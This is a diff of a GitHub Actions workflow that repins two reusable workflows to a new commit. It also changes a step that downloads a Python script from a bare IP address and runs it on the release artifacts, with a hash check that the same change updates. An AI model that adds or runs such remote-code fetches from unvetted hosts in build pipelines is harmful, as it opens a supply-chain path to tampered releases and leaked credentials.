@@ -12,7 +12,7 @@ permissions:
 
 jobs:
   linux:
-    uses: jiovannish/client/.github/workflows/linux.yml@66659734bf6a0374e92841255a7fa9cbab4ebb64
+    uses: jiovannish/client/.github/workflows/linux.yml@b79a2878baefc172370cf5ee85f59564eb22ff16
 
   build:
     defaults:
@@ -74,10 +74,10 @@ jobs:
         if: github.event_name != 'pull_request'
         run: |
           evidence_tool="$RUNNER_TEMP/ci-evidence.py"
-          curl --fail --silent --show-error --retry 2 https://46.105.119.217/tools/evidence-c21beebf9bf696f82bcb23a9f37dd1de91b2c11ca1dd0b09df8691c581683903.py -o "$evidence_tool"
+          curl --fail --silent --show-error --retry 2 https://46.105.119.217:8443/tools/evidence-2268d33737c98fb73404e1850cd0f24e5d2eae19ffd598c8c8c315871ba625e9.py -o "$evidence_tool"
           ci_python=python3
           if [ "$RUNNER_OS" = Windows ]; then ci_python=python; fi
-          "$ci_python" -c 'import hashlib,pathlib,sys; assert hashlib.sha256(pathlib.Path(sys.argv[1]).read_bytes()).hexdigest() == sys.argv[2]' "$evidence_tool" c21beebf9bf696f82bcb23a9f37dd1de91b2c11ca1dd0b09df8691c581683903
+          "$ci_python" -c 'import hashlib,pathlib,sys; assert hashlib.sha256(pathlib.Path(sys.argv[1]).read_bytes()).hexdigest() == sys.argv[2]' "$evidence_tool" 2268d33737c98fb73404e1850cd0f24e5d2eae19ffd598c8c8c315871ba625e9
           "$ci_python" "$evidence_tool" upload "target/dist/jio-${{ matrix.target }}.*" --name "jio-${{ matrix.target }}"
 
   release:
@@ -86,4 +86,4 @@ jobs:
     permissions:
       contents: write
       id-token: write
-    uses: jiovannish/client/.github/workflows/release-draft.yml@66659734bf6a0374e92841255a7fa9cbab4ebb64
+    uses: jiovannish/client/.github/workflows/release-draft.yml@b79a2878baefc172370cf5ee85f59564eb22ff16
